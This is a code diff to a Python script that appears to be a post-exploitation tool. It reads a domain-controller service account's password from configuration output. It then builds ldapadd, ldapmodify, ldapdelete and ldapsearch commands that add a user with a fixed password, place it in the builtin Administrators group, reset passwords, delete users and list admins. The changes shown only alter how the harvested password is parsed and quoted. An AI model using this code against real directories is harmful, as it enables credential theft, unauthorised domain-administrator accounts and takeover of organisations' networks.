@@ -21,7 +21,7 @@ def GetLDAPConfig():
     dcAccountDN = result[index2:].split('\n')[0].split('"')[2]
     
     index3 = result.find("dcAccountPassword")
-    dcAccountPassword = result[index3:].split('\n')[0].split('"')[2]
+    dcAccountPassword = result[index3:].split('\n')[0].split()[2][1:-1].replace('\\"', '"')
     
     print("[+] dcAccount: " + dcAccount)
     print("[+] dcAccountDN: " + dcAccountDN)
@@ -63,7 +63,7 @@ userPassword: P@ssWord123@@
     fo.close()
 
     print("[*] Try to add the data")
-    command = "ldapadd -x -h {dcAccount} -D \"{dcAccountDN}\" -w \"{dcAccountPassword}\" -f adduser.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
+    command = "ldapadd -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -f adduser.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
     print("[+] Command: " + command)
     result = RunCommand(command)
     print(result)
@@ -102,7 +102,7 @@ member: {dn}
     fo.close()
 
     print("[*] Try to modify the data")
-    command = "ldapmodify -x -h {dcAccount} -D \"{dcAccountDN}\" -w \"{dcAccountPassword}\" -f addadmin.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
+    command = "ldapmodify -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -f addadmin.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
     print("[+] Command: " + command)
     result = RunCommand(command)
     print(result)
@@ -139,7 +139,7 @@ userPassword: {newpassword}
     fo.close()
 
     print("[*] Try to modify the data")
-    command = "ldapmodify -x -h {dcAccount} -D \"{dcAccountDN}\" -w \"{dcAccountPassword}\" -f changepass.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
+    command = "ldapmodify -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -f changepass.ldif".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)
     print("[+] Command: " + command)
     result = RunCommand(command)
     print(result)
@@ -160,7 +160,7 @@ def DeleteUser():
     dn = input("input the user dn: ")
 
     print("[*] Try to delete the data")
-    command = "ldapdelete -x -h {dcAccount} -D \"{dcAccountDN}\" -w \"{dcAccountPassword}\" \"{dn}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, dn = dn)
+    command = "ldapdelete -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' \"{dn}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, dn = dn)
     print("[+] Command: " + command)
     result = RunCommand(command)
     print(result)
@@ -174,7 +174,7 @@ def GetAdmin():
     adminbase = "cn=Administrators,cn=Builtin," + base
 
     print("[*] Try to get the data")
-    command = "ldapsearch -x -h {dcAccount} -D \"{dcAccountDN}\" -w \"{dcAccountPassword}\" -b \"{adminbase}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)
+    command = "ldapsearch -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -b \"{adminbase}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)
     print("[+] Command: " + command)
     result = RunCommand(command)
     print("[+] Admin User:")
@@ -193,7 +193,7 @@ def GetUser():
     adminbase = "cn=Users," + base
 
     print("[*] Try to get the data")
-    command = "ldapsearch -x -h {dcAccount} -D \"{dcAccountDN}\" -w \"{dcAccountPassword}\" -b \"{adminbase}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)
+    command = "ldapsearch -x -h {dcAccount} -D \"{dcAccountDN}\" -w '{dcAccountPassword}' -b \"{adminbase}\"".format(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)
     print("[+] Command: " + command)
     result = RunCommand(command)
 
